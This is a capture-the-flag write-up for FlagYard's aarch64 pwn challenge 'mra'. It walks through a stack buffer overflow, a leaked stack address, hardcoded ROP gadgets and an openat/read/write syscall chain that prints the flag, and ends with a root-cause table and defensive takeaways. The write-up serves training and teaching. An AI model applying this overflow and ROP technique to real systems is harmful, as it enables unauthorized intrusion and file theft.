# FlagYard CTF — mra

**Writeup by [Fares Badaj](https://www.linkedin.com/in/FaresBadaj)**

> **Fares Badaj** — *Red Team Operator | Penetration Tester Specialist*
>
> **Telegram:** [@ptok3](https://t.me/ptok3) · **GitHub:** [github.com/FaresBadaj](https://github.com/FaresBadaj) · **LinkedIn:** [linkedin.com/in/FaresBadaj](https://www.linkedin.com/in/FaresBadaj) · **Credly:** [credly.com/users/faresbadaj](https://www.credly.com/users/faresbadaj)

- **Platform:** FlagYard (Lab Training CTF)
- **Author:** Flagyard
- **Category:** Pwn
- **Difficulty:** Medium (متوسط)

> *"My arm is overflowing with bugs, can u prove that?"*

---

## The short version

A tiny aarch64 binary lets us overflow a "Last Name" field. All we need after that is a handful of gadgets and a few raw `svc #0` syscalls:

1. Leak a **stack pointer** from the "First Name" prompt.
2. Overflow into a **ROP chain** that does `openat(AT_FDCWD, path, 0)` and returns to the menu.
3. Then a second overflow does **`read(3, buf, 0x100)` + `write(1, buf, 0x100)`** with the *already-open* flag file descriptor.
4. Brute-force a few file paths until the flag falls out.

**Flag:** `FlagY{1ca96f4d43ee1b44a4586dbcaa11974f}`

---

## First look at the binary

`file` says aarch64. Running it shows a small menu and a "fill your form" option:

```
[*] Menu
1. ...
2. Fill ur info
Choice: 2
Enter ur First Name (max 6 chars):
hint: 0xffffc0d0a8       <-- the binary LEAKS a stack address, on purpose
Enter ur Last Name (max 6 chars):
```

Two very interesting facts pop out immediately:

1. The **First Name prompt leaks a stack hint** — free address info for our ROP chain.
2. The **Last Name field** says `max 6 chars` but clearly reads up to **255 bytes** into a tiny stack buffer.

`max 6 chars` … but we can send 255. That's the "overflowing arm."

Wait — let's line that up with the description. *"My arm is overflowing with bugs."* The "arm" is literally the **ARM architecture**, and it's overflowing. Cute.

I built the payload with **pwntools context `aarch64`** and poured over the gadget sheet. The binary is **non-PIE at fixed addresses**, so gadgets are hardcoded:

```python
G_X0 = 0x400808   # ldp x0, x3, [sp], #0x10 ; br x3
G_X1 = 0x400810   # ldp x1, x3, [sp], #0x10 ; br x3
G_X2 = 0x400818   # ldp x2, x3, [sp], #0x10 ; br x3
G_X8 = 0x400820   # ldp x8, x3, [sp], #0x10 ; br x3
G_SVC = 0x400828  # svc #0
MENU  = 0x400940
```

Yes — the binary **stocks its own syscall gadgets and even a "go back to menu" address**. It's basically handing us the building blocks.

---

## The ROP building block: one syscall at a time

On aarch64 a syscall is:

```
x8 = syscall number
x0, x1, x2 = arguments
svc #0
```

Each `ldp xK, x3, [sp], #0x10 ; br x3` gadget pops one register then jumps to the next address in our stack. So we can build a chain like:

```python
# set x0
[G_X0][ x0-value ]
# set x1
[G_X1][ x1-value ]
# set x2
[G_X2][ x2-value ]
# set x8
[G_X8][ syscall-no ]
[G_SVC]                     # svc #0
```

And here's the neat part: after the chain, the function epilogue (`add sp, #0x30 ; ret`) re-uses the **tail of our buffer** as a *second* chain. That gives us a clean "pass 1 → pass 2" pattern in one 255-byte payload.

For the first overflow I used that tail to **return to MENU** (`menu_bridge = True`) so the program happily serves us again. It literally asks for the next input — no crash, no drama.

---

## The leak: `buf = hint - 6`

The stack hint points somewhere inside our `First Name` buffer. The payload lives right after it, so:

```python
leak  = int(prompt.split(b'hint: ')[1], 16)
buf   = leak - 6          # the buffer start relative to the hint
```

Now every stack address inside the chain (like the path string) becomes computable.

---

## Getting the flag — three syscalls, two connections

**Session A — open the flag file:**

```python
openat(AT_FDCWD, path, 0)      # syscall 56
```

The path string is embedded in the payload at `buf + 0x5c`. After the syscall we jump back to the menu (payload tail = `[0, G_X1, 0, G_X2, 0, G_X8, 0, MENU]`).

If `openat` succeeds it returns a small fd — 0, 1, 2 are taken by the process, so the freshly opened flag lands on **fd 3**.

**Session B — read then write it out:**

```python
read(3, dest, 0x100)          # syscall 63  -> fd 3 into heap/stack buffer
write(1, dest, 0x100)         # syscall 64  -> buffer to stdout, then crash
```

Two files, one purpose: `dest = buf + 0x110` so it doesn't collide with the chain. The second session hangs the process afterwards (no menu bridge) — we don't care, we got our bytes.

**Path brute-force:** I don't know where the flag file lives, so I just ask nicely. A short list:

```python
/flag, /flag.txt, /home/ctf/flag, /app/flag, /chall/flag, ./flag
```

One of them is bound to be right. And the fourth one *was*:

```
▶ openat(/app/flag) + read + write  (path 4/6)
▶ [█████████████████░░░]  85.0%  flag leaked via openat/read/write chain
✓ FLAG = FlagY{1ca96f4d43ee1b44a4586dbcaa11974f}

╔══════════════════════════════════════════════════════════╗
║                   ★  FLAG RECOVERED  ★                    ║
║      FlagY{1ca96f4d43ee1b44a4586dbcaa11974f}              ║
║                    elapsed 12.3 s                         ║
╚══════════════════════════════════════════════════════════╝
[+] saved to ...\flag_from_mra.txt
```

---

## Root causes (what actually went wrong)

| Bug | Where | Impact |
|---|---|---|
| No length check on "Last Name" input | form-fill | classic stack buffer overflow |
| Stack hint leaked in "First Name" prompt | form-fill | ASLR effectively defeated |
| Non-PIE binary at fixed addresses | binary | hardcoded ROP gadgets |
| SYS GADGETS baked into the binary | binary | trivial syscall ROP chains |
| No seccomp / syscall filtering | runtime | raw `openat/read/write` allowed |
| Flag file path guessable | deployment | `/app/flag` brute-forced in 4 tries |

---

## Takeaways

- **"max 6 chars" means nothing if the code trusts it.** Bounds checks live in the code, not in the prompt.
- **Never ship syscall gadgets in your gadget zone.** A `svc #0` + a few `ldp...; br` = a fully general ROP syscall primitive.
- **aarch64 ROP basics:** every syscall needs `x8` (number) plus `x0/x1/x2` (args), and a single `ldp Xd, x3, [sp], #0x10 ; br x3` gadget family is all the control you need.
- **Stack leaks beat ASLR.** A tiny hint printed to the user is a free `PIE` disable.
- When you don't know where the file is, **enumerate** — the flag file is usually two guesses away.

---

## The exploit

Full colored version lives in the same folder as this writeup:

```
mra_solve.py
```

Run it and paste `host:port` (or pass it as a CLI argument), and it walks
the whole chain with a single moving progress line:

```bash
python3 mra_solve.py
Enter the MRA challenge target (host:port): tcp.flagyard.com:21290
```

On success it prints the flag panel and saves the flag to
`flag_from_mra.txt` next to the script.

*My arm is overflowing with bugs, can u prove that?* — proven. 🏁